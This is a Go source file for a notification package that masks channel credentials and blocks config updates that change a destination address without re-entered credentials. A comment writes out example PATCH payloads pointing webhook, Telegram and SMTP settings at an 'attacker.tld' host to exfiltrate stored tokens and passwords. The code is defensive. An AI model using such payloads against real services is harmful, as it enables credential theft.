package notify

import (
	"encoding/json"
	"fmt"
	"strings"

	"github.com/Autumn-27/artex/locale"
)

// MaskedPrefix is the marker prefix for masked values. When the API echoes a
// credential back, it replaces the real content with a value carrying this
// prefix, and when the update endpoint receives a value with this prefix it
// interprets it as "keep the stored value unchanged".
//
// A prefix is used instead of an empty string or some fixed constant so that a
// little identifying information can be carried along (see MaskedValue), letting
// the user tell "which bot this is" without having to re-paste the secret.
const MaskedPrefix = "__masked__"

// MaskedValue produces a masked value:
//
//	"__masked__"              original value too short, give no hint at all
//	"__masked__:…ab12cd"      carry the last 6 characters as an identifying hint
//
// Exposing only the last 6 characters is a deliberate choice: the identifying
// information in a webhook address is in its tail (such as the WeCom key or the
// Feishu bot id), while the prefix part is the same across bots and has no
// identifying value. The last 6 characters are not enough to reconstruct the
// credential, but enough for the configurer to recognize "that's my group".
func MaskedValue(secret string) string {
	if len(secret) <= 6 {
		return MaskedPrefix
	}
	return MaskedPrefix + ":…" + secret[len(secret)-6:]
}

// IsMasked reports whether a value is a masked value (i.e. echoed back by the
// endpoint and left unmodified).
func IsMasked(v string) bool { return strings.HasPrefix(v, MaskedPrefix) }

// MaskConfig returns a copy of the config with the channel's credential fields
// replaced by masked values.
//
// An unknown channel type returns an empty map rather than the original config —
// better to have the UI show "config unavailable" than to spit the whole
// original content, which may contain credentials, back out when the channel
// type cannot be recognized. Non-credential fields are kept as-is so the UI can
// display them normally.
func MaskConfig(kind string, cfg map[string]any) map[string]any {
	channel, ok := Get(kind)
	if !ok {
		return map[string]any{}
	}
	secrets := map[string]bool{}
	for _, k := range channel.SecretKeys() {
		secrets[k] = true
	}
	out := make(map[string]any, len(cfg))
	for k, v := range cfg {
		if !secrets[k] {
			out[k] = v
			continue
		}
		// Nested structures like headers are treated as a single credential as a
		// whole: judging each sub-key would require every channel to declare
		// another set of rules for "which sub-keys are credentials", whose
		// complexity far outweighs the benefit.
		if s, ok := v.(string); ok {
			out[k] = MaskedValue(s)
			continue
		}
		out[k] = MaskedPrefix
	}
	return out
}

// ErrDestinationChangedWithoutCredentials means "the destination address
// changed, but the caller did not take a position on the credential fields".
// It is returned instead of silently allowing the update through or silently
// discarding the credentials; for the reasoning see PrepareConfigUpdate.
type ErrDestinationChangedWithoutCredentials struct {
	Changed []string // destination keys that changed
	Missing []string // credential keys with no explicit position taken
}

// Message renders the error in the requested language (see locale.ErrorMessage).
func (e *ErrDestinationChangedWithoutCredentials) Message(lang locale.Lang) string {
	return e.Error()
}

func (e *ErrDestinationChangedWithoutCredentials) Error() string {
	return "the destination address (" + strings.Join(e.Changed, ", ") + ") has changed; please re-enter the credential fields (" +
		strings.Join(e.Missing, ", ") + ") as well: fill in new values, or explicitly leave them blank to indicate credentials are no longer needed. " +
		"The original credentials are valid only for the old address; continuing to reuse them is equivalent to handing them to the new address."
}

// PrepareConfigUpdate merges channel config and handles the security-sensitive
// case of a "destination address change".
//
// It replaces bare MergeConfig on the channel update path, addressing this
// empirically exploitable path: the destination address (where messages go) and
// the credentials (what identity they are sent with) are two independent sets of
// fields, while MergeConfig keeps the stored value for any "unmentioned" key.
// So anyone able to PATCH a channel can, by **changing only the address and
// staying silent about the credentials**, make the server send the real stored
// credentials to an endpoint they control:
//
//	webhook  {config:{url:"https://attacker.tld"}}  → the original Authorization header goes out with the request
//	telegram {config:{base_url:"https://attacker.tld"}} → /bot<realToken>/sendMessage
//	email    {config:{host:"smtp.attacker.tld"}}    → hands over the username and password after STARTTLS
//
// This path is completely silent and does not depend on a redirect (so refusing
// cross-host hops does not stop it), and it directly defeats this package's
// masking goal — "credentials are not echoed back to the browser".
//
// Rule: as soon as some destination key is changed to a new value, the caller
// must take an explicit position on **every** credential key:
//   - give a new value → use the new value
//   - explicitly pass an empty string → the field no longer needs a credential (keep the clearing semantics)
//   - echo the masked value back as-is / simply omit the key → reject
//
// The third case is also rejected because the meaning of a "masked value" is
// precisely "reuse the old credential", and the old credential is valid only for
// the old address. "Automatically discarding credentials" is deliberately not
// done here — for optional credential fields (webhook's headers, email's
// password) that would silently turn into "auth is gone but the endpoint returns
// 200", which is harder to diagnose than an error. Better to have the operator
// fill it in one more time.
func PrepareConfigUpdate(kind string, stored, incoming map[string]any) (map[string]any, error) {
	channel, ok := Get(kind)
	if !ok {
		return nil, fmt.Errorf("channel type %q is not registered", kind)
	}
	secrets := channel.SecretKeys()
	destinations := channel.DestinationKeys()

	// If a non-string credential value (such as webhook's headers, which is an
	// object) has a masked literal embedded in it, the caller has stuffed the
	// "keep the original value" sentinel inside the struct. MergeConfig only
	// recognizes "a string with the prefix" as masked, so this shape would be
	// stored as-is like an ordinary object — the literal "__masked__" actually
	// lands in the database, and later auth silently fails with no error at all.
	// Better to reject it.
	//
	// This check must come **first**: when the address has not changed the
	// function returns early, so putting it later would cover only the "address
	// changed" path (the first version placed it wrong this way, and a test
	// caught it directly).
	if err := rejectMaskedInContainers(incoming, secrets); err != nil {
		return nil, err
	}

	// Find the destination keys that were actually changed. A masked value
	// counts as "not changed".
	var changed []string
	for _, key := range destinations {
		raw, present := incoming[key]
		if !present {
			continue
		}
		s, isStr := raw.(string)
		if isStr && IsMasked(s) {
			continue
		}
		if !sameConfigValue(raw, stored[key]) {
			changed = append(changed, key)
		}
	}
	if len(changed) == 0 {
		// The address did not change; use a plain merge (masked values keep the
		// original, empty strings clear, everything else overwrites).
		return MergeConfig(stored, incoming), nil
	}

	// The address changed: require an explicit position on every credential key.
	var missing []string
	for _, key := range secrets {
		raw, present := incoming[key]
		if !present {
			missing = append(missing, key)
			continue
		}
		if s, isStr := raw.(string); isStr && IsMasked(s) {
			missing = append(missing, key)
		}
	}
	if len(missing) > 0 {
		return nil, &ErrDestinationChangedWithoutCredentials{Changed: changed, Missing: missing}
	}
	return MergeConfig(stored, incoming), nil
}

// rejectMaskedInContainers rejects submissions that embed the masking sentinel
// inside a non-string structure.
//
// The masking mechanism assumes "the whole value is a string". An object field
// like webhook's headers can only be masked as a whole (written as the string
// "__masked__") or submitted as a whole; stuffing the sentinel inside the object
// neither expresses "keep unchanged" nor avoids being stored as a real value.
func rejectMaskedInContainers(incoming map[string]any, secretKeys []string) error {
	for _, key := range secretKeys {
		raw, present := incoming[key]
		if !present {
			continue
		}
		if _, isStr := raw.(string); isStr {
			continue
		}
		encoded, err := json.Marshal(raw)
		if err != nil {
			continue
		}
		if strings.Contains(string(encoded), MaskedPrefix) {
			return fmt.Errorf("the content of field %s contains the mask marker %q: this field can only be left blank as a whole to reuse the existing value, or submitted as a whole with a new value; a mask placeholder cannot be smuggled inside the struct",
				key, MaskedPrefix)
		}
	}
	return nil
}

// sameConfigValue compares whether two config values are equivalent. Comparing
// via JSON serialization also handles type differences along the way — the port
// submitted by the frontend is a number, while the one read back from the
// database is a float64, and a direct == would misjudge.
//
// "Blank" must be normalized before comparing: an empty string and "the key does
// not exist" are the same state in this config model, because MergeConfig treats
// an empty string as an explicit clear and deletes the key outright. Without
// normalization, an optional destination field that is always left blank
// (Telegram's base_url is the only such field: blank means use the official
// address) would take this path —
//
//	base_url:"" is stored at creation time  →  the first save has MergeConfig delete the key
//	→ on the second save incoming is "" and the key is missing from stored, judged as "the address changed"
//	→ the credential is a masked value → 400 "the destination address has changed; please re-enter the credential fields as well"
//
// From then on every save fails, unless the user re-pastes the Bot Token, even
// though they changed nothing.
func sameConfigValue(a, b any) bool {
	if isBlankConfigValue(a) && isBlankConfigValue(b) {
		return true
	}
	ra, errA := json.Marshal(a)
	rb, errB := json.Marshal(b)
	if errA != nil || errB != nil {
		return false
	}
	return string(ra) == string(rb)
}

// isBlankConfigValue decides whether a config value is "blank".
// The criterion must match MergeConfig's clearing test (strings.TrimSpace(s) ==
// ""), otherwise a gap appears where "MergeConfig thinks it should be deleted
// but sameConfigValue thinks it has a value".
func isBlankConfigValue(v any) bool {
	if v == nil {
		return true
	}
	s, ok := v.(string)
	return ok && strings.TrimSpace(s) == ""
}

// MergeConfig merges incoming on top of stored, for updating channel config.
//
// Rules:
//   - a key whose incoming value is masked → keep stored's original value (the user did not change this field)
//   - a key whose incoming value is an empty string → treat as an explicit clear and delete the key
//   - all other keys → overwrite with incoming's value
//   - keys present in stored but not in incoming → keep (partial-update semantics)
//
// Whether an empty string counts as "clearing" needs to be explicit: the
// frontend form submits unfilled fields as empty strings, and writing them in as
// valid values would actually clear a field that was "left blank to keep the
// original value". Explicit clearing is chosen here because the user has no
// other way to express clearing a misconfigured field (dropping the field could
// distinguish "not provided" from "provided empty", but the UI does not use that
// distinction).
func MergeConfig(stored, incoming map[string]any) map[string]any {
	out := make(map[string]any, len(stored)+len(incoming))
	for k, v := range stored {
		out[k] = v
	}
	for k, v := range incoming {
		if s, ok := v.(string); ok {
			if IsMasked(s) {
				continue // masked value = unmodified, keep stored
			}
			if strings.TrimSpace(s) == "" {
				delete(out, k)
				continue
			}
			out[k] = s
			continue
		}
		out[k] = v
	}
	return out
}
